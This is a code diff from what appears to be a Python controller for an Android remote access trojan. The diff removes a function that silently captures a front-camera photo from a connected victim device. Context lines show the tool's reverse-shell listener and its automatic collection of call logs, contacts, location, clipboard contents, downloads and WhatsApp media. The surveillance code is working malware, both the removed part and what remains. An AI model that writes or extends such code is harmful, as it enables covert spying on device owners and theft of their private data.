@@ -129,8 +129,6 @@ def help():
     getClipData                --> return the current saved text from the clipboard
     getMACAddress              --> returns the mac address of the device
     exit                       --> exit the interpreter
-    
-    NOTE: Front camera photo is automatically captured on first connection
     """
     print(helper)
 
@@ -698,71 +696,9 @@ def autoDownloadWhatsAppMedia(client, device_folder, max_files=10):
         traceback.print_exc()
         return False
 
-def autoCaptureFrontCamera(conn, device_folder):
-    """Automatically capture a photo from the front camera"""
-    try:
-        print(stdOutput("info")+"📷 Capturing front camera photo...")
-        
-        # Clear any buffered data
-        clear_recv_buffer(conn)
-        
-        # Front camera is typically camera ID 1 (0 is back camera)
-        conn.send("takepic 1\n".encode("UTF-8"))
-        time.sleep(1)
-        
-        # Check for IMAGE response
-        msg = conn.recv(1024).decode("UTF-8", errors="ignore")
-        if "IMAGE" not in msg:
-            print(stdOutput("warning")+"Front camera not responding, trying camera ID 0...")
-            clear_recv_buffer(conn)
-            conn.send("takepic 0\n".encode("UTF-8"))
-            time.sleep(1)
-            msg = conn.recv(1024).decode("UTF-8", errors="ignore")
-            
-        if "IMAGE" in msg:
-            # Receive the image data
-            print(stdOutput("info")+"Downloading front camera image...")
-            imageBuffer = recvall(conn)
-            imageBuffer = imageBuffer.strip().replace("END123", "").strip()
-            
-            if imageBuffer and imageBuffer != "":
-                try:
-                    # Decode and save the image
-                    timestr = time.strftime("%Y%m%d_%H%M%S")
-                    filename = f"{device_folder}{direc}front_camera_{timestr}.jpg"
-                    
-                    imgdata = base64.b64decode(imageBuffer)
-                    with open(filename, 'wb') as img:
-                        img.write(imgdata)
-                    
-                    size_kb = len(imgdata) / 1024
-                    print(stdOutput("success")+f"📷 Front camera photo saved ({size_kb:.1f} KB): {filename}")
-                    return True
-                    
-                except Exception as e:
-                    print(stdOutput("error")+f"Failed to decode front camera image: {e}")
-                    return False
-            else:
-                print(stdOutput("error")+"Empty image data received from camera")
-                return False
-        else:
-            print(stdOutput("error")+"Unable to connect to camera")
-            return False
-            
-    except Exception as e:
-        print(stdOutput("error")+f"Front camera capture failed: {e}")
-        return False
-
 def executeParallelCommands(conn, priority_cmds, device_folder, completed_commands):
     """Execute commands with optimized batching and parallelization where possible"""
     print(stdOutput("info")+"========== STARTING OPTIMIZED PARALLEL DATA COLLECTION ==========")
-    
-    # Phase 0: Front camera capture (FIRST PRIORITY)
-    if 'front_camera' in priority_cmds and 'front_camera' not in completed_commands:
-        print(stdOutput("info")+"📷 Phase 0: Front camera capture")
-        success = autoCaptureFrontCamera(conn, device_folder)
-        if success:
-            completed_commands.add('front_camera')
     
     # Phase 1: Fast text commands (can be done quickly in sequence)
     text_commands = ['call_logs', 'contacts', 'location', 'downloads']
@@ -1307,9 +1243,6 @@ def get_shell(ip,port):
             
             # Optimized parallel auto-retrieval system  
             priority_cmds = []
-            # Front camera capture is ALWAYS the first priority
-            if 'front_camera' not in completed_commands:
-                priority_cmds.append('front_camera')
             if 'call_logs' not in completed_commands:
                 priority_cmds.append('call_logs')
             if 'contacts' not in completed_commands:
